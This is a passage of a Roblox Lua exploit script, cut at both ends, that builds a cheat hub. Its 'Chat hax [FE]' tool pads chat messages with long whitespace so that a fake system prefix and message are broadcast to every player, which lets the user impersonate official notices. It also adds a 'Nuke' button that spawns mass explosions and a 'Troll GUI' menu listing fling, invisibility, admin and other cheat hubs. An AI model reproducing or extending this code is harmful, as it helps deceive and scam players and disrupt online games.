	SPrefix.Name = "SPrefix"
	SPrefix.Parent = systemprefixf
	SPrefix.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	SPrefix.BackgroundTransparency = 1.000
	SPrefix.BorderColor3 = Color3.fromRGB(27, 42, 53)
	SPrefix.BorderSizePixel = 0
	SPrefix.Position = UDim2.new(0.0437499993, 0, 0, 0)
	SPrefix.Size = UDim2.new(0.906250179, 0, 0.888888896, 0)
	SPrefix.ClearTextOnFocus = false
	SPrefix.Font = Enum.Font.SourceSans
	SPrefix.PlaceholderColor3 = Color3.fromRGB(0, 255, 0)
	SPrefix.PlaceholderText = ""
	SPrefix.Text = ""
	SPrefix.TextColor3 = Color3.fromRGB(0, 255, 0)
	SPrefix.TextScaled = true
	SPrefix.TextSize = 14.000
	SPrefix.TextWrapped = true
	SPrefix.TextXAlignment = Enum.TextXAlignment.Left
	
	TextLabel4.Name = "TextLabel4"
	TextLabel4.Parent = Frame
	TextLabel4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel4.BackgroundTransparency = 1.000
	TextLabel4.BorderSizePixel = 0
	TextLabel4.Position = UDim2.new(0.0294117816, 0, 0.612244904, 0)
	TextLabel4.Size = UDim2.new(0.356617659, 0, 0.0952380896, 0)
	TextLabel4.Font = Enum.Font.ArialBold
	TextLabel4.Text = "Message:"
	TextLabel4.TextColor3 = Color3.fromRGB(0, 255, 0)
	TextLabel4.TextScaled = true
	TextLabel4.TextSize = 14.000
	TextLabel4.TextWrapped = true
	TextLabel4.TextXAlignment = Enum.TextXAlignment.Left
	
	systemmessagef.Name = "systemmessagef"
	systemmessagef.Parent = Frame
	systemmessagef.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	systemmessagef.BorderSizePixel = 0
	systemmessagef.Position = UDim2.new(0.386029392, 0, 0.612244904, 0)
	systemmessagef.Size = UDim2.new(0.588235378, 0, 0.346938789, 0)
	
	UICorner_7.CornerRadius = UDim.new(0, 3)
	UICorner_7.Parent = systemmessagef
	
	SMessage.Name = "SMessage"
	SMessage.Parent = systemmessagef
	SMessage.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	SMessage.BackgroundTransparency = 1.000
	SMessage.BorderColor3 = Color3.fromRGB(27, 42, 53)
	SMessage.BorderSizePixel = 0
	SMessage.Position = UDim2.new(0.0437499993, 0, 0, 0)
	SMessage.Size = UDim2.new(0.918749988, 0, 0.999999762, 0)
	SMessage.ClearTextOnFocus = false
	SMessage.Font = Enum.Font.SourceSans
	SMessage.PlaceholderColor3 = Color3.fromRGB(99, 110, 114)
	SMessage.PlaceholderText = ""
	SMessage.Text = ""
	SMessage.TextColor3 = Color3.fromRGB(0, 255, 0)
	SMessage.TextSize = 14.000
	SMessage.TextWrapped = true
	SMessage.TextXAlignment = Enum.TextXAlignment.Left
	SMessage.TextYAlignment = Enum.TextYAlignment.Top
	
	Send.Name = "Send"
	Send.Parent = Frame
	Send.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Send.BorderSizePixel = 0
	Send.Position = UDim2.new(0.0330882259, 0, 0.795918405, 0)
	Send.Size = UDim2.new(0.319853008, 0, 0.122448981, 0)
	Send.Font = Enum.Font.SourceSans
	local fakekey = string.upper(hotkey)
	Send.Text = "Send [".. fakekey.. "]"
	Send.TextColor3 = Color3.fromRGB(0, 255, 0)
	Send.TextScaled = true
	Send.TextSize = 14.000
	Send.TextWrapped = true
	
	UICorner_8.CornerRadius = UDim.new(0, 3)
	UICorner_8.Parent = Send
	
	
	local function TTJVP_fake_script() -- Frame.Dragify 
		local script = Instance.new('LocalScript', Frame)
		
		local UIS = game:GetService("UserInputService")
		local function dragify(Frame)
			local dragToggle = nil
			local dragSpeed = 0
			local dragInput = nil
			local dragStart = nil
			local dragPos = nil
			function updateInput(input)
				local Delta = input.Position - dragStart
				local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
				game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
			end
			Frame.InputBegan:Connect(function(input)
				if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
					dragToggle = true
					dragStart = input.Position
					startPos = Frame.Position
					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragToggle = false
						end
					end)
				end
			end)
			Frame.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end)
			game:GetService("UserInputService").InputChanged:Connect(function(input)
				if input == dragInput and dragToggle then
					updateInput(input)
				end
			end)
		end
		
		dragify(script.Parent)
	end
	coroutine.wrap(TTJVP_fake_script)()
	
	local script = Instance.new('LocalScript', Frame)
	
	local pg = game.Players.LocalPlayer.PlayerGui:WaitForChild("FakeMessageGUI").Frame
	
	local UMessage = pg.usermessagef.UMessage
	local SPrefix = pg.systemprefixf.SPrefix
	local SMessage = pg.systemmessagef.SMessage
	local SendB = pg.Send
	
	SendB.MouseButton1Click:Connect(function()
		local A_1   = UMessage.Text.."                                                                                                                                              ".. SPrefix.Text.. " ".. SMessage.Text
		local A_2   = "All"
		local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
		Event:FireServer(A_1, A_2)
		print("Sent fake message.")
	end)
	
	local player = game.Players.LocalPlayer
	local mouse = player:GetMouse()
	local actualkey = string.lower(hotkey)
	
	mouse.KeyDown:connect(function(key)
		if key == actualkey then
			local A_1   = UMessage.Text.."                                                                                                                                              ".. SPrefix.Text.. " ".. SMessage.Text
			local A_2   = "All"
			local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
			Event:FireServer(A_1, A_2)
			print("Sent fake message.")
		end
	end)
end
------------------------------------------------------

local Loader = Instance.new("ScreenGui")
local Background = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local t1 = Instance.new("TextLabel")
local t2 = Instance.new("TextLabel")
local SubjectFrame = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local Subject = Instance.new("TextLabel")
local t3 = Instance.new("TextLabel")

Loader.Name = "Loader"
Loader.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Loader.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Loader.DisplayOrder = 10000

Background.Name = "Background"
Background.Parent = Loader
Background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Background.BorderSizePixel = 0
Background.ClipsDescendants = true
Background.Position = UDim2.new(0.499000013, 0, 0.353784859, 0)
Background.Size = UDim2.new(0, 0, 0.288844615, 0)

UICorner.Parent = Background

t1.Name = "t1"
t1.Parent = Background
t1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
t1.BackgroundTransparency = 1.000
t1.BorderSizePixel = 0
t1.Position = UDim2.new(0.0808080807, 0, 0.110344827, 0)
t1.Size = UDim2.new(0.835016727, 0, 0.296551734, 0)
t1.Font = Enum.Font.GothamBlack
t1.Text = "Chat hax [FE]"
t1.TextColor3 = Color3.fromRGB(0, 255, 0)
t1.TextScaled = true
t1.TextSize = 14.000
t1.TextTransparency = 1.000
t1.TextWrapped = true

t2.Name = "t2"
t2.Parent = Background
t2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
t2.BackgroundTransparency = 1.000
t2.BorderSizePixel = 0
t2.Position = UDim2.new(0.0808080807, 0, 0.351724148, 0)
t2.Size = UDim2.new(0.835016727, 0, 0.137931034, 0)
t2.Font = Enum.Font.SourceSansLight
t2.Text = "by Security Hacker"
t2.TextColor3 = Color3.fromRGB(0, 255, 0)
t2.TextScaled = true
t2.TextSize = 14.000
t2.TextTransparency = 1.000
t2.TextWrapped = true

SubjectFrame.Name = "SubjectFrame"
SubjectFrame.Parent = Background
SubjectFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SubjectFrame.BorderSizePixel = 0
SubjectFrame.Position = UDim2.new(0.0419999994, 0, 1, 0)
SubjectFrame.Size = UDim2.new(0.923149765, 0, 0.275065273, 0)

UICorner_2.Parent = SubjectFrame

local SUBJECT = "Thanks for using"
Subject.Name = "Subject"
Subject.Parent = SubjectFrame
Subject.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Subject.BackgroundTransparency = 1.000
Subject.BorderSizePixel = 0
Subject.Position = UDim2.new(0.0420838557, 0, 0.0752172545, 0)
Subject.Size = UDim2.new(0.904530346, 0, 0.849565387, 0)
Subject.Font = Enum.Font.SourceSansBold
Subject.Text = SUBJECT
Subject.TextColor3 = Color3.fromRGB(0, 255, 0)
Subject.TextScaled = true
Subject.TextSize = 14.000
Subject.TextWrapped = true

t3.Name = "t3"
t3.Parent = Background
t3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
t3.BackgroundTransparency = 1.000
t3.BorderSizePixel = 0
t3.Position = UDim2.new(0.434343427, 0, 0.845555723, 0)
t3.Size = UDim2.new(0.134680107, 0, 0.154444426, 0)
t3.Font = Enum.Font.ArialBold
t3.Text = "Loading."
t3.TextColor3 = Color3.fromRGB(0, 255, 0)
t3.TextScaled = true
t3.TextSize = 14.000
t3.TextTransparency = 1.000
t3.TextWrapped = true

local function DZNO_fake_script()
	local script = Instance.new('LocalScript', t3)

	while true do
		wait(0.5)
		script.Parent.Text = "Loading.."
		wait(0.5)
		script.Parent.Text = "Loading..."
	end
end
coroutine.wrap(DZNO_fake_script)()

local function GLEDHUR_fake_script()
	local script = Instance.new('LocalScript', Loader)

	local BG = script.Parent.Background
	local SF = script.Parent.Background.SubjectFrame
	
	wait(2)
	BG:TweenSizeAndPosition(UDim2.new(0.362, 0, 0.289, 0), UDim2.new(0.319, 0, 0.355, 0), 'Out', 'Quint', 2)
	wait(2)
	local Info = TweenInfo.new(0.5)
	local Tween = game:GetService("TweenService"):Create(BG.t1,Info,{TextTransparency=0})
	local Tween2 = game:GetService("TweenService"):Create(BG.t2,Info,{TextTransparency=0})
	local Tween3 = game:GetService("TweenService"):Create(BG.t3,Info,{TextTransparency=0})
	Tween:Play()
	Tween2:Play()
	wait(1.5)
	SF:TweenPosition(UDim2.new(0.042, 0, 0.57, 0), 'Out', 'Quad', 0.5)
	wait(1)
	Tween3:Play()
	local loadwait = math.random(2,4)
	wait(loadwait)
	BG.t3.LocalScript:Destroy()
	wait(0.1)
	BG.t3.Text = "Loading.."
	MainExploit()
	wait(1)
	BG.t3.Text = "Ready!"
	wait(1.5)
	BG:TweenPosition(UDim2.new(0.319, 0, -0.4, 0), 'InOut', 'Quad', 1.5)
	wait(2)
	script.Parent:Destroy()
end
coroutine.wrap(GLEDHUR_fake_script)()

end)
Tab3Section:NewButton("Nuke", "Nukes the WHOLE SERVER", function(SN)
for i,v in pairs (game.Workspace:GetChildren()) do
if v.Name == "Nuke" then
v:Destroy()
end
end
wait(1)
local Tool = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
Tool.Name = "Detonater"
local Mouse = game.Players.LocalPlayer:GetMouse()

local Place = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
Place.Name = "Placer"
Nuke = Instance.new("Model")
Nuke.Parent = game.Workspace
Nuke.Name = "Nuke"

x5 = 1
Mouse.Button1Down:connect(function()
if x5 == 1 then
if Place.Active == true then
local name = game.Players.LocalPlayer.Name
local Part1 = Instance.new("Part")
Part1.Name = "Part"
Part1.Parent = Nuke
Part1.Size = Vector3.new(12,1,6)
Part1.Position = Mouse.Hit.p
Part1.BottomSurface = "Smooth"
Part1.TopSurface = "Smooth"
Part1.Material = "Metal"
Part1.BrickColor = BrickColor.new("Really black")
Part1.Anchored = true
local x1 = game.Workspace.Nuke.Part.Position.X
local y1 = game.Workspace.Nuke.Part.Position.Y
local z1 = game.Workspace.Nuke.Part.Position.Z
local Part2 = Instance.new("Part")
Part2.Name = "Detonate"
Part2.Parent = Nuke
Part2.Size = Vector3.new(10, 5, 5)
Part2.Position = Vector3.new(x1,y1+2,z1)
Part2.BottomSurface = "Smooth"
Part2.TopSurface = "Smooth"
Part2.Material = "Metal"
Part2.BrickColor = BrickColor.new("Really black")
Part2.Anchored = true
Part2.Shape = "Cylinder"
x5 = x5+1
local Decal = Instance.new("Decal")
Decal.Texture = "http://www.roblox.com/asset/?id=14301975"
Decal.Parent = Part2
Decal.Face = "Back"
end
end
end)


Mouse.Button1Down:connect(function()
if Tool.Active == true then
local nuke = Instance.new("Part")
nuke.Position = game.Workspace.Nuke.Detonate.Position
nuke.Anchored = true
nuke.Parent = game.Workspace
local x, y, z = 5, 5, 5
nuke.BrickColor = BrickColor.new ("New Yeller")
nuke.Size = Vector3.new(x, y, z)
nuke.CanCollide = false
nuke.Name = "nuke"
nuke.Shape = "Ball"
nuke.Transparency = 0.3
nuke.Material = "Neon"
nuke.Locked = true
game.Workspace.Nuke:Destroy()
while x <= 100 do
x, y, z = x+1, y+1, z+1
nuke.Size = Vector3.new(x, y, z)
local explosion = Instance.new("Explosion")
explosion.BlastPressure = 1000000
explosion.BlastRadius = x-15
explosion.DestroyJointRadiusPercent = 1
explosion.ExplosionType = "Craters"
explosion.Parent = game.Workspace
explosion.Position = game.Workspace.nuke.Position 
explosion.Hit:connect(function(Part, Distance)
if Part.Name ~= "nuke" then
Part.Anchored = false
Part:BreakJoints()
end
end) 
wait(0.01)
end
while x <= 200 do
x, y, z = x+3, y+3, z+3
nuke.Size = Vector3.new(x, y, z)
local explosion = Instance.new("Explosion")
explosion.BlastPressure = 1000000
explosion.BlastRadius = x+50
explosion.DestroyJointRadiusPercent = 1
explosion.ExplosionType = "Craters"
explosion.Parent = game.Workspace
explosion.Position = game.Workspace.nuke.Position
explosion.Hit:connect(function(Part, Distance)
if Part.Name ~= "nuke" then
Part.Anchored = false
Part:BreakJoints()
end
end)
wait(0.01)
end
game.Workspace.nuke:Destroy()
x5 = 1
Nuke = Instance.new("Model")
Nuke.Parent = game.Workspace
Nuke.Name = "Nuke"
Tool.Active = false
end
end)
end)
Tab3Section:NewButton("Troll GUI", "", function(TG)
-- Gui to Lua
-- Version: 3.2

-- Instances:

local TrollingGUI = Instance.new("ScreenGui")
local mainframe = Instance.new("Frame")
local r15frame = Instance.new("Frame")
local r15blockhead = Instance.new("TextButton")
local r15creeper = Instance.new("TextButton")
local r15waist = Instance.new("TextButton")
local jdaskfjksdjkf = Instance.new("TextLabel")
local r15blockhats = Instance.new("TextButton")
local r15animations = Instance.new("TextButton")
local r15invisible = Instance.new("TextButton")
local r15admin = Instance.new("TextButton")
local r15antiafk = Instance.new("TextButton")
local otherframe = Instance.new("Frame")
local dogscript = Instance.new("TextButton")
local iyuoyuioyu = Instance.new("TextLabel")
local skatescript = Instance.new("TextButton")
local skateframe = Instance.new("Frame")
local closeskate = Instance.new("TextButton")
local ghjkghjk = Instance.new("TextLabel")
local puiopui = Instance.new("TextLabel")
local skateopen = Instance.new("TextButton")
local fathonhub = Instance.new("TextButton")
local legacyhub = Instance.new("TextButton")
local phonegui = Instance.new("TextButton")
local ezhub = Instance.new("TextButton")
local ragdoll = Instance.new("TextButton")
local topkek = Instance.new("TextButton")
local savetoolframe = Instance.new("Frame")
local hdfgkhkdfhk = Instance.new("TextLabel")
local loadtools = Instance.new("TextButton")
local savetools = Instance.new("TextButton")
local ouiyoyuio = Instance.new("TextLabel")
local rainbow1 = Instance.new("Frame")
local rainbow2 = Instance.new("Frame")
local r6frame = Instance.new("Frame")
local r6blockhead = Instance.new("TextButton")
local r6creeper = Instance.new("TextButton")
local r6Car = Instance.new("TextButton")
local gdfhdfgh = Instance.new("TextLabel")
local r6pyramid = Instance.new("TextButton")
local r6animations = Instance.new("TextButton")
local r6flingscript = Instance.new("TextButton")
local r6admin = Instance.new("TextButton")
local r6antiafk = Instance.new("TextButton")
local racecarrequirement = Instance.new("TextButton")
local carframe = Instance.new("Frame")
local closecar = Instance.new("TextButton")
local fasdfasf = Instance.new("TextLabel")
local vxcvxcv = Instance.new("TextLabel")
local r15open = Instance.new("TextButton")
local r6open = Instance.new("TextButton")
local opentools = Instance.new("TextButton")
local utyuty = Instance.new("TextLabel")
local otheropen = Instance.new("TextButton")
local mbnmbnm = Instance.new("TextLabel")
local mbnmbnm_2 = Instance.new("TextLabel")

--Properties:

TrollingGUI.Name = "TrollingGUI"
TrollingGUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

mainframe.Name = "mainframe"
mainframe.Parent = TrollingGUI
mainframe.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
mainframe.BorderSizePixel = 4
mainframe.Position = UDim2.new(0.454040706, 0, 0.16216217, 0)
mainframe.Size = UDim2.new(0, 148, 0, 550)

r15frame.Name = "r15frame"
r15frame.Parent = mainframe
r15frame.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
r15frame.BorderSizePixel = 4
r15frame.Position = UDim2.new(1, 0, -0.038181819, 0)
r15frame.Size = UDim2.new(0, 164, 0, 298)
r15frame.Visible = false

r15blockhead.Name = "r15blockhead"
r15blockhead.Parent = r15frame
r15blockhead.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
r15blockhead.BorderSizePixel = 0
r15blockhead.Position = UDim2.new(0.0426829271, 0, 0.0201342274, 0)
r15blockhead.Size = UDim2.new(0, 151, 0, 25)
r15blockhead.Font = Enum.Font.RobotoMono
r15blockhead.Text = "BlockHead"
r15blockhead.TextColor3 = Color3.fromRGB(255, 255, 255)
r15blockhead.TextSize = 20.000
r15blockhead.TextWrapped = true

r15creeper.Name = "r15creeper"
r15creeper.Parent = r15frame
r15creeper.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
r15creeper.BorderSizePixel = 0
r15creeper.Position = UDim2.new(0.0426829271, 0, 0.127516776, 0)
r15creeper.Size = UDim2.new(0, 151, 0, 25)
r15creeper.Font = Enum.Font.RobotoMono
r15creeper.Text = "Creeper script"
r15creeper.TextColor3 = Color3.fromRGB(255, 255, 255)
r15creeper.TextSize = 20.000
r15creeper.TextWrapped = true

r15waist.Name = "r15waist"
r15waist.Parent = r15frame
r15waist.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
r15waist.BorderSizePixel = 0
r15waist.Position = UDim2.new(0.0365853682, 0, 0.248322159, 0)
r15waist.Size = UDim2.new(0, 151, 0, 25)
r15waist.Font = Enum.Font.RobotoMono
r15waist.Text = "Remove waist"
r15waist.TextColor3 = Color3.fromRGB(255, 255, 255)
r15waist.TextSize = 20.000
r15waist.TextWrapped = true

jdaskfjksdjkf.Name = "jdaskfjksdjkf"
jdaskfjksdjkf.Parent = r15frame
jdaskfjksdjkf.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
jdaskfjksdjkf.BackgroundTransparency = 1.000
jdaskfjksdjkf.Position = UDim2.new(0, 0, -0.0704697967, 0)
jdaskfjksdjkf.Size = UDim2.new(0, 164, 0, 20)
jdaskfjksdjkf.Font = Enum.Font.SourceSansBold
jdaskfjksdjkf.Text = "R15 Scripts"
jdaskfjksdjkf.TextColor3 = Color3.fromRGB(0, 0, 0)
jdaskfjksdjkf.TextScaled = true
jdaskfjksdjkf.TextSize = 14.000
jdaskfjksdjkf.TextWrapped = true

r15blockhats.Name = "r15blockhats"
r15blockhats.Parent = r15frame
r15blockhats.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
r15blockhats.BorderSizePixel = 0
r15blockhats.Position = UDim2.new(0.0426829308, 0, 0.3657718, 0)
r15blockhats.Size = UDim2.new(0, 151, 0, 25)
r15blockhats.Font = Enum.Font.RobotoMono
r15blockhats.Text = "Block Hats"
r15blockhats.TextColor3 = Color3.fromRGB(255, 255, 255)
r15blockhats.TextSize = 20.000
r15blockhats.TextWrapped = true

r15animations.Name = "r15animations"
r15animations.Parent = r15frame
r15animations.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
r15animations.BorderSizePixel = 0
r15animations.Position = UDim2.new(0.0426829308, 0, 0.493288577, 0)
r15animations.Size = UDim2.new(0, 151, 0, 25)
r15animations.Font = Enum.Font.RobotoMono
r15animations.Text = "AnimationGUI"
r15animations.TextColor3 = Color3.fromRGB(255, 255, 255)
r15animations.TextSize = 20.000
r15animations.TextWrapped = true

r15invisible.Name = "r15invisible"
r15invisible.Parent = r15frame
r15invisible.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
r15invisible.BorderSizePixel = 0
r15invisible.Position = UDim2.new(0.0426829308, 0, 0.607382536, 0)
r15invisible.Size = UDim2.new(0, 151, 0, 25)
r15invisible.Font = Enum.Font.RobotoMono
r15invisible.Text = "Invisible Script"
r15invisible.TextColor3 = Color3.fromRGB(255, 255, 255)
r15invisible.TextSize = 20.000
r15invisible.TextWrapped = true

r15admin.Name = "r15admin"
r15admin.Parent = r15frame
r15admin.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
r15admin.BorderSizePixel = 0
r15admin.Position = UDim2.new(0.0426829308, 0, 0.728187859, 0)
r15admin.Size = UDim2.new(0, 151, 0, 25)
r15admin.Font = Enum.Font.RobotoMono
r15admin.Text = "Shattervest "
r15admin.TextColor3 = Color3.fromRGB(255, 255, 255)
r15admin.TextSize = 20.000
r15admin.TextWrapped = true

r15antiafk.Name = "r15antiafk"
r15antiafk.Parent = r15frame
r15antiafk.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
r15antiafk.BorderSizePixel = 0
r15antiafk.Position = UDim2.new(0.0426829308, 0, 0.84563756, 0)
r15antiafk.Size = UDim2.new(0, 151, 0, 25)
r15antiafk.Font = Enum.Font.RobotoMono
r15antiafk.Text = "Anti-AFK"
r15antiafk.TextColor3 = Color3.fromRGB(255, 255, 255)
r15antiafk.TextSize = 20.000
r15antiafk.TextWrapped = true

otherframe.Name = "otherframe"
otherframe.Parent = mainframe
otherframe.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
otherframe.BorderSizePixel = 4
otherframe.Position = UDim2.new(-1.10810804, 0, 0.50363636, 0)
otherframe.Size = UDim2.new(0, 164, 0, 298)
otherframe.Visible = false

dogscript.Name = "dogscript"
dogscript.Parent = otherframe
dogscript.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
dogscript.BorderSizePixel = 0
dogscript.Position = UDim2.new(0.0365853682, 0, 0.0637583882, 0)
dogscript.Size = UDim2.new(0, 151, 0, 25)
dogscript.Font = Enum.Font.RobotoMono
dogscript.Text = "Dog Script R6"
dogscript.TextColor3 = Color3.fromRGB(255, 255, 255)
dogscript.TextSize = 20.000
dogscript.TextWrapped = true

iyuoyuioyu.Name = "iyuoyuioyu"
iyuoyuioyu.Parent = otherframe
iyuoyuioyu.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
iyuoyuioyu.BackgroundTransparency = 1.000
iyuoyuioyu.Position = UDim2.new(0, 0, 1, 0)
iyuoyuioyu.Size = UDim2.new(0, 164, 0, 20)
iyuoyuioyu.Font = Enum.Font.SourceSansBold
iyuoyuioyu.Text = "Other Scripts"
iyuoyuioyu.TextColor3 = Color3.fromRGB(0, 0, 0)
iyuoyuioyu.TextScaled = true
iyuoyuioyu.TextSize = 14.000
iyuoyuioyu.TextWrapped = true

skatescript.Name = "skatescript"
skatescript.Parent = otherframe
skatescript.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
skatescript.BorderSizePixel = 0
skatescript.Position = UDim2.new(0.0365853682, 0, 0.177852347, 0)
skatescript.Size = UDim2.new(0, 151, 0, 25)
skatescript.Font = Enum.Font.RobotoMono
skatescript.Text = "Skateboard R6"
skatescript.TextColor3 = Color3.fromRGB(255, 255, 255)
skatescript.TextSize = 20.000
skatescript.TextWrapped = true

skateframe.Name = "skateframe"
skateframe.Parent = otherframe
skateframe.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
skateframe.BorderSizePixel = 0
skateframe.Position = UDim2.new(-0.84785378, 0, 0.0874429494, 0)
skateframe.Size = UDim2.new(0, 100, 0, 100)
skateframe.Visible = false

closeskate.Name = "closeskate"
closeskate.Parent = skateframe
closeskate.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
closeskate.BorderSizePixel = 0
closeskate.Position = UDim2.new(0, 0, 0.850000024, 0)
closeskate.Size = UDim2.new(0, 100, 0, 15)
closeskate.Font = Enum.Font.SourceSansBold
closeskate.Text = "CLOSE"
closeskate.TextColor3 = Color3.fromRGB(0, 0, 0)
closeskate.TextScaled = true
closeskate.TextSize = 14.000
closeskate.TextWrapped = true

ghjkghjk.Name = "ghjkghjk"
ghjkghjk.Parent = skateframe
ghjkghjk.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ghjkghjk.BackgroundTransparency = 1.000
ghjkghjk.Size = UDim2.new(0, 100, 0, 47)
ghjkghjk.Font = Enum.Font.SourceSansBold
ghjkghjk.Text = "This Script Requires A certain hat to be run"
ghjkghjk.TextColor3 = Color3.fromRGB(255, 255, 255)
ghjkghjk.TextScaled = true
ghjkghjk.TextSize = 14.000
ghjkghjk.TextWrapped = true

puiopui.Name = "puiopui"
puiopui.Parent = skateframe
puiopui.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
puiopui.BackgroundTransparency = 1.000
puiopui.Position = UDim2.new(0, 0, 0.469999999, 0)
puiopui.Size = UDim2.new(0, 100, 0, 38)
puiopui.Font = Enum.Font.SourceSansBold
puiopui.Text = "Hat : Cold Stare Skateboard"
puiopui.TextColor3 = Color3.fromRGB(255, 255, 255)
puiopui.TextScaled = true
puiopui.TextSize = 14.000
puiopui.TextWrapped = true

skateopen.Name = "skateopen"
skateopen.Parent = otherframe
skateopen.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
skateopen.BorderSizePixel = 0
skateopen.Position = UDim2.new(-0.170731664, 0, 0.171140954, 0)
skateopen.Size = UDim2.new(0, 28, 0, 28)
skateopen.Font = Enum.Font.SourceSans
skateopen.Text = "?"
skateopen.TextColor3 = Color3.fromRGB(0, 0, 0)
skateopen.TextScaled = true
skateopen.TextSize = 14.000
skateopen.TextWrapped = true

fathonhub.Name = "fathonhub"
fathonhub.Parent = otherframe
fathonhub.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
fathonhub.BorderSizePixel = 0
fathonhub.Position = UDim2.new(0.0365853682, 0, 0.302013427, 0)
fathonhub.Size = UDim2.new(0, 151, 0, 25)
fathonhub.Font = Enum.Font.RobotoMono
fathonhub.Text = "Fathom Hub"
fathonhub.TextColor3 = Color3.fromRGB(255, 255, 255)
fathonhub.TextSize = 20.000
fathonhub.TextWrapped = true

legacyhub.Name = "legacyhub"
legacyhub.Parent = otherframe
legacyhub.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
legacyhub.BorderSizePixel = 0
legacyhub.Position = UDim2.new(0.0365853682, 0, 0.42281878, 0)
legacyhub.Size = UDim2.new(0, 151, 0, 25)
legacyhub.Font = Enum.Font.RobotoMono
legacyhub.Text = "Legacy Hub"
legacyhub.TextColor3 = Color3.fromRGB(255, 255, 255)
legacyhub.TextSize = 20.000
legacyhub.TextWrapped = true

phonegui.Name = "phonegui"
phonegui.Parent = otherframe
phonegui.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
phonegui.BorderSizePixel = 0
phonegui.Position = UDim2.new(0.0365853682, 0, 0.543624163, 0)
phonegui.Size = UDim2.new(0, 151, 0, 25)
phonegui.Font = Enum.Font.RobotoMono
phonegui.Text = "Phone GUI"
phonegui.TextColor3 = Color3.fromRGB(255, 255, 255)
phonegui.TextSize = 20.000
phonegui.TextWrapped = true

ezhub.Name = "ezhub"
ezhub.Parent = otherframe
ezhub.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
ezhub.BorderSizePixel = 0
ezhub.Position = UDim2.new(0.0365853682, 0, 0.664429545, 0)
ezhub.Size = UDim2.new(0, 151, 0, 25)
ezhub.Font = Enum.Font.RobotoMono
ezhub.Text = "Ez HUB"
ezhub.TextColor3 = Color3.fromRGB(255, 255, 255)
ezhub.TextSize = 20.000
ezhub.TextWrapped = true

ragdoll.Name = "ragdoll"
ragdoll.Parent = otherframe
ragdoll.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
ragdoll.BorderSizePixel = 0
ragdoll.Position = UDim2.new(0.0365853682, 0, 0.775167823, 0)
ragdoll.Size = UDim2.new(0, 151, 0, 25)
ragdoll.Font = Enum.Font.RobotoMono
ragdoll.Text = "Ragdoll Engine"
ragdoll.TextColor3 = Color3.fromRGB(255, 255, 255)
ragdoll.TextSize = 20.000
ragdoll.TextWrapped = true

topkek.Name = "topkek"
topkek.Parent = otherframe
topkek.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
topkek.BorderSizePixel = 0
topkek.Position = UDim2.new(0.0365853682, 0, 0.889261782, 0)
topkek.Size = UDim2.new(0, 151, 0, 25)
topkek.Font = Enum.Font.RobotoMono
topkek.Text = "topk3k"
topkek.TextColor3 = Color3.fromRGB(255, 255, 255)
topkek.TextSize = 20.000
topkek.TextWrapped = true

savetoolframe.Name = "savetoolframe"
savetoolframe.Parent = mainframe
savetoolframe.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
savetoolframe.BorderSizePixel = 4
savetoolframe.Position = UDim2.new(-1.10810804, 0, -0.0381818414, 0)
savetoolframe.Size = UDim2.new(0, 164, 0, 298)
savetoolframe.Visible = false

hdfgkhkdfhk.Name = "hdfgkhkdfhk"
hdfgkhkdfhk.Parent = savetoolframe
hdfgkhkdfhk.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
hdfgkhkdfhk.BackgroundTransparency = 1.000
hdfgkhkdfhk.Position = UDim2.new(0, 0, -0.0704697967, 0)
hdfgkhkdfhk.Size = UDim2.new(0, 164, 0, 20)
hdfgkhkdfhk.Font = Enum.Font.SourceSansBold
hdfgkhkdfhk.Text = "Save/Load Tools"
